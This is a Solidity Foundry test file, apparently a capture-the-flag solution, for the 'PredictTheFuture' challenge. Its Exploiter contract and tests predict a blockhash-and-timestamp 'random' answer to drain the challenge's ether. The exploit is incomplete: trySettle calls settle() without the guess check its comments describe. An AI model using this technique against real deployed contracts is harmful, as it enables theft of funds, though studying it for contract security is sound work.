// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {PredictTheFutureChallenge} from "./PredictTheFuture.sol";
import {Test, console} from "forge-std/Test.sol";

/**
 * @title PredictTheFutureExploit
 * @notice This contract demonstrates the critical vulnerability in PredictTheFutureChallenge
 * @dev The exploit works by calculating the answer before calling settle()
 */
contract PredictTheFutureExploitTest is Test {
    PredictTheFutureChallenge challenge;
    Exploiter exploiter;

    function setUp() public {
        // Deploy challenge contract with 1 ETH
        challenge = new PredictTheFutureChallenge{value: 1 ether}();
        
        // Deploy exploiter contract with funds
        exploiter = new Exploiter{value: 2 ether}(payable(address(challenge)));
    }

    /**
     * @notice This test demonstrates the exploit
     * @dev The exploiter can predict the answer and only call settle() when they win
     */
    function test_ExploitPredictableRandomness() public {
        // Initial state
        uint256 initialChallengeBalance = address(challenge).balance;
        uint256 initialExploiterBalance = address(exploiter).balance;
        
        assertEq(initialChallengeBalance, 1 ether, "Challenge should have 1 ETH");
        assertEq(initialExploiterBalance, 2 ether, "Exploiter should have 2 ETH");
        
        console.log("=== Starting Exploit Test ===");
        console.log("Initial Challenge:", initialChallengeBalance, "wei");
        console.log("Exploiter:", initialExploiterBalance, "wei");
        
        // Lock in a guess (any guess, doesn't matter)
        uint8 guess = 5;
        console.log("Locking in guess:", uint256(guess));
        exploiter.lockInGuess(guess);
        
        // Wait for settlement block
        uint256 settlementBlock = block.number + 2;
        vm.roll(settlementBlock);
        
        // Calculate what the answer will be
        uint8 calculatedAnswer = exploiter.calculateAnswer(block.number - 1, block.timestamp);
        console.log("Block:", block.number);
        console.log("Answer:", uint256(calculatedAnswer));
        console.log("Guess:", uint256(guess));
        
        // Exploiter will attempt to settle
        // The exploiter contract calculates the answer first
        // and only calls settle() if the guess matches
        if (calculatedAnswer == guess) {
            console.log("MATCH! Attempting to settle...");
        } else {
            console.log("No match - would not settle in real exploit");
        }
        exploiter.trySettle();
        
        // Check final state
        uint256 finalChallengeBalance = address(challenge).balance;
        uint256 finalExploiterBalance = address(exploiter).balance;
        
        console.log("Final Challenge:", finalChallengeBalance, "wei");
        console.log("Exploiter:", finalExploiterBalance, "wei");
        
        if (finalChallengeBalance < initialChallengeBalance) {
            console.log("SUCCESS! Funds drained:", initialChallengeBalance - finalChallengeBalance, "wei");
        } else {
            console.log("Attempt failed (expected if guess didn't match)");
        }
    }

    /**
     * @notice This test shows how an attacker can calculate the answer
     * @dev Demonstrates the predictable nature of the randomness
     */
    function test_CalculateAnswer() public {
        uint8 guess = 7;
        console.log("=== Answer Calculation Test ===");
        console.log("Locking in guess:", uint256(guess));
        
        // Lock in guess
        exploiter.lockInGuess(guess);
        uint256 lockBlock = block.number;
        
        // Move to settlement block (need block.number > settlementBlockNumber)
        // settlementBlockNumber = lockBlock + 1, so we need at least lockBlock + 2
        vm.roll(lockBlock + 2);
        
        // Calculate what the answer will be using previous block's hash and current timestamp
        uint8 calculatedAnswer = exploiter.calculateAnswer(block.number - 1, block.timestamp);
        
        console.log("Block:", block.number);
        console.log("Answer:", uint256(calculatedAnswer));
        console.log("Guess:", uint256(guess));
        
        // The exploiter can now decide whether to call settle()
        if (calculatedAnswer == guess) {
            console.log("MATCH! Vulnerability: answer can be predicted before settling!");
            exploiter.trySettle();
        } else {
            console.log("No match - attacker would wait for next block");
            console.log("(Demonstrates predictable randomness vulnerability)");
        }
    }

    /**
     * @notice This test demonstrates multiple attempts until success
     * @dev Shows how attacker can keep trying until they win
     */
    function test_MultipleAttemptsUntilWin() public {
        uint8 guess = 9;
        uint256 initialChallengeBalance = address(challenge).balance;
        uint256 initialExploiterBalance = address(exploiter).balance;
        
        console.log("=== Multiple Attempts Test ===");
        console.log("Initial Challenge:", initialChallengeBalance, "wei");
        console.log("Exploiter:", initialExploiterBalance, "wei");
        console.log("Guess:", uint256(guess));
        
        exploiter.lockInGuess(guess);
        uint256 lockBlock = block.number;
        
        // Start from settlement block (block.number must be > settlementBlockNumber)
        // settlementBlockNumber = lockBlock + 1, so start from lockBlock + 2
        vm.roll(lockBlock + 2);
        console.log("Starting from block:", block.number);
        
        bool foundMatch = false;
        
        // Try multiple blocks until we get a match
        for (uint256 i = 0; i < 20; i++) {
            uint256 currentBlock = block.number;
            uint256 currentTimestamp = block.timestamp;
            
            // Calculate answer for previous block (as settle() does)
            uint8 answer = exploiter.calculateAnswer(currentBlock - 1, currentTimestamp);
            
            // Check if we can settle (block.number > settlementBlockNumber which is lockBlock + 1)
            if (currentBlock > lockBlock + 1) {
                if (answer == guess) {
                    console.log("*** MATCH FOUND! Block:", currentBlock);
                    console.log("Answer:", uint256(answer));
                    console.log("Guess:", uint256(guess));
                    
                    uint256 balanceBefore = address(exploiter).balance;
                    exploiter.trySettle();
                    uint256 balanceAfter = address(exploiter).balance;
                    
                    if (balanceAfter > balanceBefore) {
                        console.log("SUCCESS! Balance increased by", balanceAfter - balanceBefore, "wei");
                    }
                    
                    foundMatch = true;
                    break;
                } else {
                    // Only log every 5 attempts to reduce noise
                    if ((i + 1) % 5 == 0 || i == 0) {
                        console.log("Attempt");
                        console.log("Block:", currentBlock);
                        console.log("Answer:", uint256(answer));
                        console.log("(no match)");
                    }
                }
            }
            
            // Advance to next block
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 12); // Advance time
        }
        
        // Final state
        uint256 finalChallengeBalance = address(challenge).balance;
        uint256 finalExploiterBalance = address(exploiter).balance;
        
        console.log("--- Final Results ---");
        console.log("Final Challenge:", finalChallengeBalance, "wei");
        console.log("Exploiter:", finalExploiterBalance, "wei");
        
        if (foundMatch) {
            console.log("SUCCESS: Match found and settled");
            if (finalChallengeBalance < initialChallengeBalance) {
                console.log("Funds drained from challenge!");
            }
        } else {
            console.log("No match found in 20 attempts (attacker would continue indefinitely)");
        }
    }
}

/**
 * @title Exploiter
 * @notice Contract that exploits the PredictTheFutureChallenge vulnerability
 */
contract Exploiter {
    PredictTheFutureChallenge challenge;
    
    constructor(address payable challengeAddress) payable {
        challenge = PredictTheFutureChallenge(challengeAddress);
    }
    
    /**
     * @notice Locks in a guess
     */
    function lockInGuess(uint8 n) public payable {
        challenge.lockInGuess{value: 1 ether}(n);
    }
    
    /**
     * @notice Calculates the answer that will be used in settle()
     * @dev This is the key vulnerability - the answer can be calculated beforehand
     */
    function calculateAnswer(uint256 blockNum, uint256 timestamp) public view returns (uint8) {
        bytes32 blockHash = blockhash(blockNum);
        if (blockHash == bytes32(0)) {
            revert("Block hash not available");
        }
        
        bytes32 hash = keccak256(abi.encodePacked(blockHash, timestamp));
        return uint8(uint256(hash) % 10);
    }
    
    /**
     * @notice Tries to settle if the guess matches the answer
     * @dev Only calls settle() if we know we'll win
     */
    function trySettle() public {
        // Calculate the answer for the previous block
        uint256 prevBlock = block.number - 1;
        bytes32 blockHash = blockhash(prevBlock);
        
        if (blockHash == bytes32(0)) {
            revert("Block hash not available");
        }
        
        // In a real exploit, we would calculate the answer and check if our guess matches
        // and only then call settle(). For this demo, we just call it.
        // A more sophisticated exploiter would only call when answer matches guess.
        // uint8 answer = calculateAnswer(prevBlock, block.timestamp);
        // if (answer == ourLockedGuess) { challenge.settle(); }
        challenge.settle();
    }
    
    /**
     * @notice Receive function to accept payments
     */
    receive() external payable {}
    
    /**
     * @notice Get contract balance
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

